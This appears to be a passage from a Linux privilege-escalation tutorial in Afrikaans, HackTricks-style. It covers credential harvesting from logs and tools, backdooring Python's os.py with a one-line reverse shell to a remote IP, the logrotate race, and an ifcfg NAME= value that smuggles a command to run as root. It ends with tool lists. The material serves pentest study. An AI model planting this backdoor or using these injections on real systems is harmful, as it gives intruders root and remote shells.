**Nog 'n interessante hulpmiddel** wat jy kan gebruik om dit te doen is: [**LaZagne**](https://github.com/AlessandroZ/LaZagne) wat 'n oopbron-toepassing is wat gebruik word om baie wagwoorde wat op 'n plaaslike rekenaar gestoor is vir Windows, Linux & Mac te onttrek.

### Logs

As jy logs kan lees, mag jy in staat wees om **interessante/vertroulike inligting daarin te vind**. Hoe meer vreemd die log is, hoe meer interessant sal dit wees (waarskynlik).\
Ook, sommige "**slegte**" geconfigureerde (backdoored?) **audit logs** mag jou toelaat om **wagwoorde** binne audit logs te **registreer** soos verduidelik in hierdie pos: [https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/).
```bash
aureport --tty | grep -E "su |sudo " | sed -E "s,su|sudo,${C}[1;31m&${C}[0m,g"
grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null
```
Om **logs te lees die groep** [**adm**](interesting-groups-linux-pe/index.html#adm-group) sal baie nuttig wees.

### Shell-lêers
```bash
~/.bash_profile # if it exists, read it once when you log in to the shell
~/.bash_login # if it exists, read it once if .bash_profile doesn't exist
~/.profile # if it exists, read once if the two above don't exist
/etc/profile # only read if none of the above exists
~/.bashrc # if it exists, read it every time you start a new shell
~/.bash_logout # if it exists, read when the login shell exits
~/.zlogin #zsh shell
~/.zshrc #zsh shell
```
### Generiese Kredensiële Soektog/Regex

Jy moet ook kyk vir lêers wat die woord "**password**" in sy **naam** of binne die **inhoud** bevat, en ook kyk vir IP's en e-posse binne logs, of hashes regexps.\
Ek gaan nie hier lys hoe om al hierdie te doen nie, maar as jy belangstel, kan jy die laaste kontroles wat [**linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh) uitvoer, nagaan.

## Skryfbare lêers

### Python biblioteek kaping

As jy weet **waar** 'n python-skrip gaan uitgevoer word en jy **kan skryf binne** daardie gids of jy kan **python biblioteke wysig**, kan jy die OS-biblioteek wysig en dit backdoor (as jy kan skryf waar die python-skrip gaan uitgevoer word, kopieer en plak die os.py biblioteek).

Om die **biblioteek te backdoor**, voeg net die volgende lyn aan die einde van die os.py biblioteek by (verander IP en PORT):
```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```
### Logrotate uitbuiting

'n Kwetsbaarheid in `logrotate` laat gebruikers met **skrywe toestemmings** op 'n loglêer of sy ouer direkteure potensieel verhoogde bevoegdhede verkry. Dit is omdat `logrotate`, wat dikwels as **root** loop, gemanipuleer kan word om arbitrêre lêers uit te voer, veral in direkteure soos _**/etc/bash_completion.d/**_. Dit is belangrik om toestemmings te kontroleer nie net in _/var/log_ nie, maar ook in enige direkteur waar logrotasie toegepas word.

> [!NOTE]
> Hierdie kwesbaarheid raak `logrotate` weergawe `3.18.0` en ouer

Meer gedetailleerde inligting oor die kwesbaarheid kan op hierdie bladsy gevind word: [https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition).

Jy kan hierdie kwesbaarheid uitbuit met [**logrotten**](https://github.com/whotwagner/logrotten).

Hierdie kwesbaarheid is baie soortgelyk aan [**CVE-2016-1247**](https://www.cvedetails.com/cve/CVE-2016-1247/) **(nginx logs),** so wanneer jy vind dat jy logs kan verander, kyk wie die logs bestuur en kyk of jy bevoegdhede kan verhoog deur die logs met simboliese skakels te vervang.

### /etc/sysconfig/network-scripts/ (Centos/Redhat)

**Kwetsbaarheid verwysing:** [**https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f**](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)

As 'n gebruiker om enige rede in staat is om **te skryf** 'n `ifcf-<whatever>` skrip na _/etc/sysconfig/network-scripts_ **of** dit kan **aanpas** 'n bestaande een, dan is jou **stelsel pwned**.

Netwerk skripte, _ifcg-eth0_ byvoorbeeld, word gebruik vir netwerkverbindinge. Hulle lyk presies soos .INI lêers. Hulle word egter \~sourced\~ op Linux deur Network Manager (dispatcher.d).

In my geval, die `NAME=` attribuut in hierdie netwerk skripte word nie korrek hanteer nie. As jy **wit/leë spasie in die naam het, probeer die stelsel om die deel na die wit/leë spasie uit te voer**. Dit beteken dat **alles na die eerste leë spasie as root uitgevoer word**.

Byvoorbeeld: _/etc/sysconfig/network-scripts/ifcfg-1337_
```bash
NAME=Network /bin/id
ONBOOT=yes
DEVICE=eth0
```
### **init, init.d, systemd, en rc.d**

Die gids `/etc/init.d` is die huis van **scripts** vir System V init (SysVinit), die **klassieke Linux diensbestuurstelsel**. Dit sluit scripts in om dienste te `begin`, `stop`, `herbegin`, en soms `herlaai`. Hierdie kan direk of deur simboliese skakels in `/etc/rc?.d/` uitgevoer word. 'n Alternatiewe pad in Redhat stelsels is `/etc/rc.d/init.d`.

Aan die ander kant, `/etc/init` is geassosieer met **Upstart**, 'n nuwer **diensbestuur** wat deur Ubuntu bekendgestel is, wat konfigurasie lêers gebruik vir diensbestuur take. Ten spyte van die oorgang na Upstart, word SysVinit scripts steeds saam met Upstart konfigurasies gebruik weens 'n kompatibiliteitslaag in Upstart.

**systemd** verskyn as 'n moderne inisialisasie en diensbestuurder, wat gevorderde funksies bied soos on-demand daemon begin, automount bestuur, en stelsels staat snapshots. Dit organiseer lêers in `/usr/lib/systemd/` vir verspreidingspakkette en `/etc/systemd/system/` vir administrateur wysigings, wat die stelsels administrasie proses stroomlyn.

## Ander Triks

### NFS Privilege escalasie

{{#ref}}
nfs-no_root_squash-misconfiguration-pe.md
{{#endref}}

### Ontsnapping uit beperkte Skale

{{#ref}}
escaping-from-limited-bash.md
{{#endref}}

### Cisco - vmanage

{{#ref}}
cisco-vmanage.md
{{#endref}}

## Kernel Sekuriteit Beskermings

- [https://github.com/a13xp0p0v/kconfig-hardened-check](https://github.com/a13xp0p0v/kconfig-hardened-check)
- [https://github.com/a13xp0p0v/linux-kernel-defence-map](https://github.com/a13xp0p0v/linux-kernel-defence-map)

## Meer hulp

[Statiese impacket binêre](https://github.com/ropnop/impacket_static_binaries)

## Linux/Unix Privesc Gereedskap

### **Beste gereedskap om na Linux plaaslike privilege escalasie vektore te soek:** [**LinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

**LinEnum**: [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)(-t opsie)\
**Enumy**: [https://github.com/luke-goddard/enumy](https://github.com/luke-goddard/enumy)\
**Unix Privesc Kontrole:** [http://pentestmonkey.net/tools/audit/unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)\
**Linux Priv Checker:** [www.securitysift.com/download/linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)\
**BeeRoot:** [https://github.com/AlessandroZ/BeRoot/tree/master/Linux](https://github.com/AlessandroZ/BeRoot/tree/master/Linux)\
**Kernelpop:** Enumereer kernel kwesbaarhede in linux en MAC [https://github.com/spencerdodd/kernelpop](https://github.com/spencerdodd/kernelpop)\
**Mestaploit:** _**multi/recon/local_exploit_suggester**_\
**Linux Exploit Suggester:** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)\
**EvilAbigail (fisiese toegang):** [https://github.com/GDSSecurity/EvilAbigail](https://github.com/GDSSecurity/EvilAbigail)\
**Versameling van meer scripts**: [https://github.com/1N3/PrivEsc](https://github.com/1N3/PrivEsc)

## Verwysings

- [https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)\\
- [https://payatu.com/guide-linux-privilege-escalation/](https://payatu.com/guide-linux-privilege-escalation/)\\
- [https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744](https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744)\\
- [http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html](http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html)\\
- [https://touhidshaikh.com/blog/?p=827](https://touhidshaikh.com/blog/?p=827)\\
- [https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf](https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf)\\
- [https://github.com/frizb/Linux-Privilege-Escalation](https://github.com/frizb/Linux-Privilege-Escalation)\\
- [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits)\\
- [https://github.com/rtcrowley/linux-private-i](https://github.com/rtcrowley/linux-private-i)
- [https://www.linux.com/news/what-socket/](https://www.linux.com/news/what-socket/)
- [https://muzec0318.github.io/posts/PG/peppo.html](https://muzec0318.github.io/posts/PG/peppo.html)
- [https://www.linuxjournal.com/article/7744](https://www.linuxjournal.com/article/7744)
- [https://blog.certcube.com/suid-executables-linux-privilege-escalation/](https://blog.certcube.com/suid-executables-linux-privilege-escalation/)
- [https://juggernaut-sec.com/sudo-part-2-lpe](https://juggernaut-sec.com/sudo-part-2-lpe)
- [https://linuxconfig.org/how-to-manage-acls-on-linux](https://linuxconfig.org/how-to-manage-acls-on-linux)
- [https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)
- [https://www.linode.com/docs/guides/what-is-systemd/](https://www.linode.com/docs/guides/what-is-systemd/)

{{#include ../../banners/hacktricks-training.md}}
